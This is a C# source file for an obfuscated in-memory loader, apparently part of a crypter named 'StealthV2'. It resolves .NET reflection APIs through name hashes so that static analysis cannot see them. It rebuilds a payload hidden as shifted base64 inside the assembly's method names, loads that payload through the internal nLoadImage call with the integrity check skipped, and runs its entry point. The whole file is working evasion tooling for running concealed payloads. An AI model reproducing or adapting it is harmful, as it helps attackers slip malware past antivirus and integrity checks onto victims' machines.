#nullable enable
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Loader
{
    public static unsafe class Loader
    {
        private static readonly Type[] Types = typeof(void).Assembly.GetTypes();

        private static readonly Dictionary<uint, MethodInfo> MethodCache = new();
        private static readonly Dictionary<uint, PropertyInfo> PropertyCache = new();

        private static readonly Dictionary<Type?, IEnumerable<MethodInfo>> TypeMethodCache = new();
        private static readonly Dictionary<Type?, IEnumerable<PropertyInfo>> TypePropertyCache = new();

        [STAThread]
        public static void Main(string[] args)
        {
            var base64FromCharPtr =
                InvokeMethod<FromBase64CharPtr>(2164246512, 528465795); // System.Convert.FromBase64CharPtr()
            var module =
                GetPropValue<Module>(4078926558, 4240424831,
                    typeof(Loader).Assembly); //typeof(StealthV2).Assembly.ManifestModule;
            byte[] payload = new byte[0x1337];
            int offset = 0;
            for (int i = 0x1338; i < 0x1339; i++)
            {
                MethodBase baseMethod =
                    InvokeMethod<MethodBase>(1274687369, 1074927592, new object?[] { i },
                        module); // System.Reflection.Module.ResolveMethod()
                string name =
                    GetPropValue<string>(4243846143, 1642051212, baseMethod); // System.Reflection.MethodBase.Name
                fixed (char* ptr = name)
                {
                    int length = GetPropValue<int>(1845477325, 4202415711, name); // System.String.Length
                    for (int j = 0; j < length; j++)
                    {
                        ptr[j] -= (char)(MethodCache.Keys.ToArray()[0] % 100 - 30);
                    }

                    byte[] data = base64FromCharPtr(ptr, length);
                    InvokeMethod<short>(2132718223, 4285503295, new object?[] { payload, offset },
                        data); // System.Array.CopyTo
                    offset += data.Length;
                }
            }

            object?[] info =
            {
                payload,
                null, // byte[] rawSymbolStore
                null, // Evidence evidence
                null, // ref  StackCrawlmark stackMark
                false, // bool fIntrospection
                true, // bool fSkipIntegrityCheck
                1 // SecurityContextSource securityContextSource => Resolves CurrentAppDomain and CurrentAssembly
            };

            var assembly =
                InvokeMethod<Assembly>(3909091325, 1082111880, info); //System.Reflection.RuntimeAssembly.nLoadImage

            var entryPoint =
                GetPropValue<MethodInfo>(4078926558, 3155696631, assembly); // System.Reflection.Runtime.EntryPoint

            object[] parameters =
                new object[InvokeMethod<ParameterInfo[]>(1891508174, 4164820959, null, entryPoint).Length];
            if (parameters.Length != 0)
                parameters[0] = args;
            InvokeMethod<object>(1891508174, 4026509245, new object?[] { null, parameters },
                entryPoint); // System.Reflection.MethodBase.Invoke(object, object[])
        }

        private static Type? GetType(uint typeHash) =>
            Types.FirstOrDefault(type => GetHash(type.FullName!) == typeHash);

        private static T InvokeMethod<T>(uint typeHash, uint methodHash, object?[]? args = null,
            object? instance = null)
        {
            if (methodHash != 528465795 && MethodCache.TryGetValue(methodHash, out var info))
                return (T)(info.Invoke(instance, args) ?? default(T))!;

            var typeDef = GetType(typeHash);

            if (!TypeMethodCache.TryGetValue(typeDef, out IEnumerable<MethodInfo> runtimeMethods))
            {
                runtimeMethods = typeDef.GetRuntimeMethods();
                // ReSharper disable once PossibleMultipleEnumeration
                TypeMethodCache.Add(typeDef, runtimeMethods);
            }

            // ReSharper disable once PossibleMultipleEnumeration
            var methodInfo = runtimeMethods.FirstOrDefault(method => GetHash(method.ToString()) == methodHash);

            if (methodInfo != null)
                MethodCache.Add(methodHash, methodInfo);

            if (methodHash == 528465795) // Hardcoded delegate resolving because Im lazy
                return (T)(object)Delegate.CreateDelegate(typeof(T), methodInfo!);

            return (T)(methodInfo?.Invoke(instance, args) ?? default(T))!;
        }

        private static T GetPropValue<T>(uint typeHash, uint propHash, object instance)
        {
            if (PropertyCache.TryGetValue(propHash, out var prop))
                return (T)prop.GetValue(instance);

            var typeDef = GetType(typeHash);

            if (!TypePropertyCache.TryGetValue(typeDef, out IEnumerable<PropertyInfo> runtimeProperties))
            {
                runtimeProperties = typeDef.GetRuntimeProperties();
                // ReSharper disable once PossibleMultipleEnumeration
                TypePropertyCache.Add(typeDef, runtimeProperties);
            }

            // ReSharper disable once PossibleMultipleEnumeration
            var propertyInfo = runtimeProperties.First(method => GetHash(method.Name) == propHash);

            PropertyCache.Add(propHash, propertyInfo);

            return (T)propertyInfo!.GetValue(instance);
        }

        private delegate byte[] FromBase64CharPtr(char* ptr, int length);

        private static uint GetHash(string name)
        {
            uint sum = 0;
            foreach (char c in name)
            {
                sum = (sum >> 0xA | sum << 0x11) + c;
            }

            // zero terminator:
            sum = (sum >> 0xA | sum << 0x11) + 0;
            return sum;
        }
    }
}
